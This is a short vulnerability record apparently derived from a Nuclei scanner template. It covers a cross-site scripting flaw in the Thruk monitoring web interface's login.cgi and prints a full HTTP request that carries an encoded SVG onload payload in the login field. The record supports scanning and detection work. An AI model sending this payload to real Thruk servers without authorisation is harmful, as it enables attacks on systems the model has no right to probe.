# Vulnerability: Thruk Monitoring Webinterface - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`thruk-xss.yaml`)

## Description
Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/cgi-bin/login.cgi.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /thruk/cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login
```

